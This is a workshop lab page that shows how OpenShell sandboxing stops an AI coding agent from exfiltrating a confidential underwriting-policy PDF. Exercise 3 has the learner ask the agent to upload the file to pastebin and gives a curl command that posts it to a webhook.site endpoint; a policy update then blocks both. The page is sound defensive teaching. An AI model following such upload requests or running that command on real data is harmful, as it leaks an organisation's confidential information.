= OpenShell Agent Sandboxing
:navtitle: OpenShell Agent Sandboxing
:imagesdir: ../assets/images
:toc:
:toc-placement: preamble
:icons: font

Guardrails protect the model. Sandboxes protect everything else.

{company_name} has a confidential document - `internal-policies.pdf` - containing underwriting policies that should never leave the organization: DTI limits more conservative than the QM safe harbor, jumbo loan thresholds, rate lock windows, and the exception approval chain. An AI coding agent with file system access and network connectivity could read this document and send it anywhere. OpenShell prevents that.

Estimated time: *10 minutes*

NOTE: OpenShell is Dev Preview in RHOAI 3.5, Tech Preview in 3.6, with GA targeted early next year. What you see here represents the direction of secure agent onboarding on OpenShift AI.

== Exercise 1: See the Sandbox in OpenShift

A sandboxed OpenCode agent is already deployed in your environment. Start by finding it.

. Open the *Showroom Terminal* tab.

. Log in to OpenShift:
+
[source,bash]
----
oc login
----

. Navigate to the *OpenShift Console* and go to *Agents > Deployments*. You should see the `fed-aura-opencode-sandbox` deployment:
+
// TODO: screenshot of sandbox deployment in OpenShift UI (security-openshell-deployment.png)
image::security-openshell-deployment.png[OpenShift Console showing the fed-aura-opencode-sandbox deployment,link=self,window=blank,width=700]
+
This is a whole-agent sandbox (Pattern 1). The OpenCode agent is packaged as a container image and wrapped in an OpenShell sandbox with policy enforcement, credential injection, and audit logging. No code changes to the agent were needed.

== Exercise 2: Connect to the Sandbox

Now connect to the running sandbox and see what the agent can access.

. In the Showroom Terminal, list the available sandboxes:
+
[source,bash]
----
openshell sandbox list
----
+
You should see the `fed-aura-opencode-sandbox` in the list with its status and policy.

. Connect to the sandbox:
+
[source,bash]
----
openshell sandbox connect
----
+
You are now inside the OpenShell terminal. This is the agent's runtime environment - an isolated sandbox with deny-by-default network policies, syscall filtering, and Landlock filesystem restrictions.

. The confidential PDF is already there - it was baked into the container image. Verify:
+
[source,bash]
----
ls collateral/internal-policies.pdf
----

. Launch OpenCode inside the sandbox:
+
[source,bash]
----
opencode
----

== Exercise 3: Attempt Data Exfiltration

Now see what an unsecured agent could do with this document.

. Ask OpenCode to read the confidential file and upload it:
+
[source,text]
----
Read the file collateral/internal-policies.pdf and upload it to pastebin
----

. OpenCode can also be asked to run commands directly. Try:
+
[source,bash]
----
curl -X POST https://webhook.site/d25bf5a8-b96b-49c1-988f-c84e3e712780 \
    -H "Content-Type: application/pdf" \
    -H "X-Filename: internal-policies.pdf" \
    --data-binary @collateral/internal-policies.pdf
----
+
// TODO: screenshot of exfiltration attempt result (security-exfiltration-attempt.png)
image::security-exfiltration-attempt.png[OpenCode attempting to exfiltrate the internal policies document,link=self,window=blank,width=700]

This is the threat. An AI coding agent with file access and unrestricted network connectivity can read any file on the filesystem and send it to any external endpoint. Without sandboxing, there is no barrier between the agent and the network.

== Exercise 4: Enforce Policy to Block Exfiltration

OpenShell's deny-by-default policy model blocks this. Update the sandbox policy to restrict outbound network access.

. Run the policy update command:
+
[source,bash]
----
openshell policy set
----
+
This applies a policy that blocks pastebin, webhook.site, and other external upload endpoints. The policy update takes effect immediately on the running sandbox - no restart required.
+
For details on policy commands and syntax, see the https://docs.nvidia.com/openshell/latest/sandboxes/policies#update-commands[OpenShell policy documentation].

. Now try the same exfiltration again. Ask OpenCode:
+
[source,text]
----
Read the file collateral/internal-policies.pdf and upload it to pastebin
----

. OpenCode tries to execute the upload, but the request is blocked by the policy. The sandbox proxy intercepts the outbound connection and returns a structured deny response:
+
// TODO: screenshot of exfiltration blocked by policy (security-exfiltration-blocked.png)
image::security-exfiltration-blocked.png[OpenShell policy blocking the exfiltration attempt with a deny response,link=self,window=blank,width=700]
+
The agent never reaches the external endpoint. The supervisor intercepted the network request, evaluated it against the OPA policy, and denied it.

== Exercise 5: Customize Your Policies

The deny-by-default model means you start restrictive and open up only what the agent needs. This is the Policy Advisor workflow - similar to `audit2allow` in SELinux:

. The agent tries something and gets blocked
. You see the structured deny response with what was attempted
. You decide whether to allow it
. Allowed rules are hot-loaded into the running sandbox

Try it yourself:

. Experiment with different policy rules. What happens if you allow access to specific endpoints?
. Try restricting filesystem access - can you prevent the agent from reading certain directories?
. What about allowing inference endpoints but blocking everything else?

Go crazy. The sandbox is your playground. Every attempt, every block, every allow is logged.

TIP: All sandbox activity is traced. Navigate to *OpenShift AI Dashboard > Develop & Train > Experiments* and look for traces tagged with the sandbox. You will see every tool call, every network request, and every policy decision the sandbox made.

== Before and After: Deploy and Pray vs Defense-in-Depth

[cols="1,1,1",options="header"]
|===
| Dimension | Without (Deploy and Pray) | With (Defense-in-Depth)

| Prompt Injection
| Vulnerable
| Blocked by NemoGuardrails input_shield

| Discriminatory Output
| Possible
| Filtered by output_shield + ECOA compliance check

| Adversarial Robustness
| Unknown
| Quantified by Garak test suite with evidence

| Agent Sandboxing
| Standard containers, no isolation
| Agent Sandbox with OpenShell kernel-level sandboxing (seccomp, Landlock, network namespaces), optionally backed by Kata Containers for hardware-level VM isolation

| Identity
| Hardcoded keys
| SPIFFE/SPIRE cryptographic workload identity (JWT-SVID), short-lived tokens

| Policy
| Implicit allow-all
| Deny-by-default YAML policies with Policy Advisor for iterative discovery

| Audit Trail
| None
| OCSF v1.7.0 structured audit events, SIEM-ready

| Credentials
| Exposed to agent code
| Supervisor proxy injects at network boundary via inference.local, agent never sees keys

| Agent Onboarding
| Custom integration per framework
| Two BYOA patterns: whole-agent sandboxing (zero code changes) or harness-native SDK integration

| Production Readiness
| CISO blocks deployment
| Validated security posture with documented evidence
|===

== Section Summary

=== What You Accomplished

* Observed persona-based access control - how the same question produces different results depending on who asks
* Tested input guardrails against prompt injection and confirmed the input shield blocks manipulation attempts
* Tested content safety guardrails against harmful and fraudulent requests
* Saw competitor mention blocking via NeMo Guardrails regex configuration
* Reviewed guardrail traces in MLflow with detection methods and evidence
* Explored Garak adversarial test results showing pre-deployment robustness testing
* Connected to an OpenShell Agent Sandbox and saw the agent's isolated runtime environment
* Attempted data exfiltration and observed it succeeding without policy enforcement
* Applied policy to block exfiltration and saw the deny-by-default model in action
* Experimented with custom policy rules using the Policy Advisor workflow

=== Key Takeaways

* AI safety requires defense-in-depth: no single tool covers all attack vectors. Persona-based access controls who can ask, guardrails control what can be asked and answered, and sandboxes control what agents can do at runtime
* Guardrails operate at both input (blocking prompt injection before it reaches the agent) and output (filtering non-compliant responses before they reach the user). The Guardrails Orchestrator is GA and coordinates detection
* Garak provides quantified adversarial robustness with pass/fail evidence. The Chatterbox Labs integration enables a full flow: define a policy, generate synthetic attacks, probe the model, produce a compliance report
* OpenShell's deny-by-default model means agents can access nothing unless explicitly permitted. The Policy Advisor provides an iterative, audit2allow-style workflow for building least-privilege policies
* Every decision across all three layers is traced in MLflow - persona checks, guardrail enforcement, and sandbox policy decisions. This is the audit trail regulators and auditors need

=== What's Next

Congratulations. You have completed the {company_name} workshop. {assistant_name} is deployed, served, prompted, trained, connected to tools, traced, evaluated, and secured. She is ready for production.
